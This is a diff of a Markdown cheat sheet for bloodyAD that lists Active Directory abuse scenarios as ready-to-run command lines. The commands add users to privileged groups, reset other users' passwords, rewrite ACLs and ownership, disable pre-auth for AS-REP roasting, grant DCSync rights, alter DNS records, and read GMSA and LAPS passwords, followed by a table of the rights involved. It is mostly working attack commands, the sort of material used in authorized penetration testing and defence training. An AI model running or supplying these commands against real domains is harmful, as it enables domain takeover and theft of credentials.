@@ -39,81 +39,140 @@ If using NTLM hash:
 
 ## Abuse Scenarios
 
-#### Add User to a Group
+### Add User to a Group
 
-Used when the attacker has:
-
-- `GenericAll`
-- `GenericWrite`
-- `AddSelf` on a group
-
-Adds a user (usually attacker) to a privileged group such as **Domain Admins**.
+Used when attacker has **GenericAll**, **GenericWrite**, or **AddSelf** on a group.
 
 ```bash
-python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local add-user-to-group -a attacker -t "Domain Admins"
+bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add groupMember 'Administrators' test
 ```
-
-## Reset Another User’s Password
-
-Used when the attacker has:
-
-- ForceChangePassword (from AllExtendedRights)
-- GenericAll
-
-Allows password reset without knowing the current password.
-
-```bash
-python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local reset-password -a victim_user -P 'NewPass123!'
-```
-
-#### Abuse WriteDACL (Access Control List)
-
-Used when the attacker has:
-
-- `WriteDACL` on a user or group
-
-Allows editing the object’s ACL to assign full control (`GenericAll`) to the attacker.
-```bash
-python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local write-dacl -a victim_user -t attacker -r GenericAll
-```
-
-#### Abuse WriteOwner (Object Ownership)
-
-Used when the attacker has:
-
-- `WriteOwner` on an object
-
-Lets the attacker take ownership of the object, then modify its ACL.
-
-```bash
-python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local write-owner -a victim_user -t attacker
-```
-
-
-#### Set PreAuthNotRequired (AS-REP Roasting)
-
-Used when the attacker has:
-
-- `GenericWrite` or `GenericAll`
-
-Disables Kerberos pre-auth for a user, enabling AS-REP roasting attacks to retrieve crackable TGT hashes.
-
-```bash
-python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local set-preauth -a target_user
-```
-
 
 ---
 
+### Reset Another User’s Password
 
-## Summary of Rights and What They Enable
+Requires **ForceChangePassword** or **GenericAll**.
+
+```bash
+bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :NTLMHASH set password targetuser NewPass123!
+```
+
+---
+
+### Abuse WriteDACL
+
+Allows editing ACLs to grant yourself **GenericAll**.
+
+```bash
+bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add genericAll <modified_object> <principal_receiving_the_right>
+```
+
+---
+
+### Abuse WriteOwner
+
+Take ownership of an object, then modify its ACL.
+
+```bash
+bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH set object victim_user owner -v attacker
+```
+
+---
+
+### Set PreAuthNotRequired (AS-REP Roasting)
+
+Disable Kerberos pre-auth to enable AS-REP roasting.
+
+```bash
+bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 add uac john.doe DONT_REQ_PREAUTH
+```
+
+---
+
+### Enable/Disable Accounts
+
+```bash
+# Disable ACCOUNTDISABLE flag
+bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 remove uac john.doe ACCOUNTDISABLE
+```
+
+---
+
+### DCSync Rights
+
+Grant DCSync to an account.
+
+```bash
+bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add dcsync administrator
+```
+
+---
+
+### DNS Record Manipulation
+
+```bash
+# Add DNS entry
+bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 add dnsRecord my_machine_name 192.168.10.48
+
+# Remove DNS entry
+bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 remove dnsRecord my_machine_name 192.168.10.48
+```
+
+---
+
+### Read Sensitive Attributes
+
+```bash
+# GMSA password
+bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword
+
+# LAPS password
+bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'COMPUTER$' --attr ms-Mcs-AdmPwd
+```
+
+---
+
+### Policy & Enumeration
+
+```bash
+# Machine quota
+bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr ms-DS-MachineAccountQuota
+
+# Minimum password length
+bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr minPwdLength
+
+# AD functional level
+bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr msDS-Behavior-Version
+```
+
+---
+
+### Enumeration Examples
+
+```bash
+# Get group members
+bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object Users --attr member
+
+# Get all users
+bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type user
+
+# Get all computers
+bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type computer
+
+# Get all containers
+bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type container
+```
+
+---
+
+## Summary of Rights
 
 |Right|Description|Enables|
 |---|---|---|
-|`GenericAll`|Full control of object|Reset passwords, modify groups, change DACLs|
-|`GenericWrite`|Write to any writable attribute|Set SPNs, change passwords, add `PreAuthNotRequired`|
-|`WriteDACL`|Modify object's ACL|Grant privileges to attacker|
-|`WriteOwner`|Change object ownership|Take control and modify DACL later|
-|`AddSelf`|Add yourself to group|Escalate to privileged group|
-|`ForceChangePassword`|Reset password w/o old one|Immediate account access|
-|`PreAuthNotRequired`|Disable Kerberos pre-auth|AS-REP roasting|
+|**GenericAll**|Full control of object|Reset passwords, modify groups, change DACLs|
+|**GenericWrite**|Write to attributes|Set SPNs, change passwords, add PreAuthNotRequired|
+|**WriteDACL**|Modify ACL|Grant privileges to attacker|
+|**WriteOwner**|Change ownership|Take control and later modify ACL|
+|**AddSelf**|Add self to group|Escalate to privileged group|
+|**ForceChangePassword**|Reset password w/o old one|Immediate account access|
+|**PreAuthNotRequired**|Disable Kerberos pre-auth|AS-REP roasting|
